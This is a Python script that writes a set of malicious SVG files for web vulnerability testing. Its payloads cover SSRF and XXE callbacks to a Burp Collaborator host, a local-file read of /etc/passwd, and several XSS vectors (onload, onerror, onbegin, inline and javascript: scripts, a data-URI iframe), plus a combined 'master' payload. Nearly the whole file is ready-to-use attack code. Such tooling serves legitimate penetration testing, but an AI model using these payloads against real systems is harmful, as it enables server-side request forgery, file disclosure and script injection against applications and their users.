from pathlib import Path

def generate_svg_payloads(output_dir, burp_collab):
    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
    base_url = f"http://{burp_collab}"
    
    ssrf_dir = output_dir / 'ssrf'
    ssrf_dir.mkdir(exist_ok=True)
    lfi_dir = output_dir / 'lfi'
    lfi_dir.mkdir(exist_ok=True)
    xxe_dir = output_dir / 'xxe'
    xxe_dir.mkdir(exist_ok=True)
    xss_dir = output_dir / 'xss'
    xss_dir.mkdir(exist_ok=True)
    
    svg_ssrf1_image = f'''<svg width="200" height="200"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="{base_url}/img1" height="200" width="200"/>
</svg>'''
    with open(ssrf_dir / "ssrf1_image.svg", 'w', encoding='utf-8') as f:
        f.write(svg_ssrf1_image)
    
    svg_ssrf2_use = f'''<svg width="200" height="200"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <use xlink:href="{base_url}/use1#foo"/>
</svg>'''
    with open(ssrf_dir / "ssrf2_use.svg", 'w', encoding='utf-8') as f:
        f.write(svg_ssrf2_use)
    
    svg_ssrf3_css_link = f'''<svg width="100%" height="100%" viewBox="0 0 100 100"
     xmlns="http://www.w3.org/2000/svg">
	<link xmlns="http://www.w3.org/1999/xhtml" rel="stylesheet" href="{base_url}/css-link" type="text/css"/>
  <circle cx="50" cy="50" r="45" fill="green"
          id="foo"/>
</svg>'''
    with open(ssrf_dir / "ssrf3_css_link.svg", 'w', encoding='utf-8') as f:
        f.write(svg_ssrf3_css_link)
    
    svg_ssrf4_css_import = f'''<svg xmlns="http://www.w3.org/2000/svg">
  <style>
    @import url({base_url}/css-import);
  </style>
  <circle cx="50" cy="50" r="45" fill="green"
          id="foo"/>
</svg>'''
    with open(ssrf_dir / "ssrf4_css_import.svg", 'w', encoding='utf-8') as f:
        f.write(svg_ssrf4_css_import)
    
    svg_ssrf5_xml_stylesheet = f'''<?xml-stylesheet href="{base_url}/xml-stylesheet"?>
<svg width="100%" height="100%" viewBox="0 0 100 100"
     xmlns="http://www.w3.org/2000/svg">
  <circle cx="50" cy="50" r="45" fill="green"
          id="foo"/>
</svg>'''
    with open(ssrf_dir / "ssrf5_xml_stylesheet.svg", 'w', encoding='utf-8') as f:
        f.write(svg_ssrf5_xml_stylesheet)
    
    svg_ssrf6_xslt = f'''<?xml version="1.0" ?>
<?xml-stylesheet href="{base_url}/xslt" type="text/xsl" ?>
<svg width="10cm" height="5cm"
     xmlns="http://www.w3.org/2000/svg">
  <rect x="2cm" y="1cm" width="6cm" height="3cm"/>
</svg>'''
    with open(ssrf_dir / "ssrf6_xslt.svg", 'w', encoding='utf-8') as f:
        f.write(svg_ssrf6_xslt)
    
    svg_ssrf7_script_external = f'''<svg width="100%" height="100%" viewBox="0 0 100 100"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <circle cx="50" cy="50" r="45" fill="green"
          id="foo"/>
  <script src="{base_url}/script-external" type="text/javascript"/>
</svg>'''
    with open(ssrf_dir / "ssrf7_script_external.svg", 'w', encoding='utf-8') as f:
        f.write(svg_ssrf7_script_external)
    
    svg_ssrf8_foreignobject_iframe = f'''<svg width="500" height="500"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <circle cx="50" cy="50" r="45" fill="green"
          id="foo"/>

  <foreignObject width="500" height="500">
    <iframe xmlns="http://www.w3.org/1999/xhtml" src="{base_url}/foreignobject-iframe"/>
  </foreignObject>
</svg>'''
    with open(ssrf_dir / "ssrf8_foreignobject_iframe.svg", 'w', encoding='utf-8') as f:
        f.write(svg_ssrf8_foreignobject_iframe)
    
    svg_lfi1_image = f'''<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
<image href="file:///etc/passwd" width="100" height="100"/>
</svg>'''
    with open(lfi_dir / "lfi1_image_file.svg", 'w', encoding='utf-8') as f:
        f.write(svg_lfi1_image)
    
    svg_xxe1_doctype = f'''<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" [
  <!ENTITY xxe SYSTEM "{base_url}/xxe-svg">
]>
<svg width="100%" height="100%" viewBox="0 0 100 100"
     xmlns="http://www.w3.org/2000/svg">
  <text x="20" y="35">My &xxe;</text>
</svg>'''
    with open(xxe_dir / "xxe1_doctype.svg", 'w', encoding='utf-8') as f:
        f.write(svg_xxe1_doctype)
    
    svg_xss1_onload = f'''<svg onload=alert(1) xmlns="http://www.w3.org/2000/svg" width="100" height="100">
<rect width="100" height="100" fill="red"/>
</svg>'''
    with open(xss_dir / "xss1_onload.svg", 'w', encoding='utf-8') as f:
        f.write(svg_xss1_onload)
    
    svg_xss2_script = f'''<svg width="100%" height="100%" viewBox="0 0 100 100"
     xmlns="http://www.w3.org/2000/svg">
  <circle cx="50" cy="50" r="45" fill="green"
          id="foo"/>
  <script type="text/javascript">
    // <![CDATA[
      document.getElementById("foo").setAttribute("fill", "blue");
      alert(1);
   // ]]>
  </script>
</svg>'''
    with open(xss_dir / "xss2_script.svg", 'w', encoding='utf-8') as f:
        f.write(svg_xss2_script)
    
    svg_xss3_image_error = f'''<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
<image href="x" onerror=alert(1) width="100" height="100"/>
</svg>'''
    with open(xss_dir / "xss3_image_error.svg", 'w', encoding='utf-8') as f:
        f.write(svg_xss3_image_error)
    
    svg_xss4_animate = f'''<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
<animate onbegin=alert(1) attributeName="x" from="0" to="100" dur="1s"/>
<rect width="100" height="100" fill="red"/>
</svg>'''
    with open(xss_dir / "xss4_animate.svg", 'w', encoding='utf-8') as f:
        f.write(svg_xss4_animate)
    
    svg_xss5_script_external = f'''<svg width="100%" height="100%" viewBox="0 0 100 100"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <circle cx="50" cy="50" r="45" fill="green"
          id="foo"/>
  <script src="javascript:alert(1)" type="text/javascript"/>
</svg>'''
    with open(xss_dir / "xss5_script_external.svg", 'w', encoding='utf-8') as f:
        f.write(svg_xss5_script_external)
    
    svg_xss6_image_onload = f'''<svg width="100%" height="100%" viewBox="0 0 100 100"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <circle cx="50" cy="50" r="45" fill="green"
          id="foo"/>
  <image xlink:href="{base_url}/foo.jpg" height="200" width="200" onload="document.getElementById('foo').setAttribute('fill', 'blue');alert(1);"/>
</svg>'''
    with open(xss_dir / "xss6_image_onload.svg", 'w', encoding='utf-8') as f:
        f.write(svg_xss6_image_onload)
    
    svg_xss7_foreignobject = f'''<svg width="500" height="500"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <circle cx="50" cy="50" r="45" fill="green"
          id="foo"/>

  <foreignObject width="500" height="500">
     <iframe xmlns="http://www.w3.org/1999/xhtml" src="data:text/html,&lt;body&gt;&lt;script&gt;alert(1)&lt;/script&gt;hi&lt;/body&gt;" width="400" height="250"/>
  </foreignObject>
</svg>'''
    with open(xss_dir / "xss7_foreignobject.svg", 'w', encoding='utf-8') as f:
        f.write(svg_xss7_foreignobject)
    
    svg_master = f'''<?xml version="1.0" encoding="ISO-8859-1"?>
<?xml-stylesheet href="{base_url}/xml-stylesheet"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" [
  <!ENTITY xxe SYSTEM "{base_url}/xxe-svg">
]>
<svg onload="alert(1)" width="500" height="500" viewBox="0 0 100 100"
     xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <link xmlns="http://www.w3.org/1999/xhtml" rel="stylesheet" href="{base_url}/css-link" type="text/css"/>
  <style>
    @import url({base_url}/css-import);
  </style>
  <circle cx="50" cy="50" r="45" fill="green" id="foo"/>
  <image xlink:href="{base_url}/img1" height="200" width="200" onload="document.getElementById('foo').setAttribute('fill', 'blue');"/>
  <use xlink:href="{base_url}/use1#foo"/>
  <text x="20" y="35">My &xxe;</text>
  <script type="text/javascript">
    // <![CDATA[
      document.getElementById("foo").setAttribute("fill", "red");
      alert(1);
   // ]]>
  </script>
  <script src="{base_url}/script-external" type="text/javascript"/>
  <foreignObject width="500" height="500">
    <iframe xmlns="http://www.w3.org/1999/xhtml" src="{base_url}/foreignobject-iframe"/>
  </foreignObject>
</svg>'''
    with open(output_dir / "master.svg", 'w', encoding='utf-8') as f:
        f.write(svg_master)
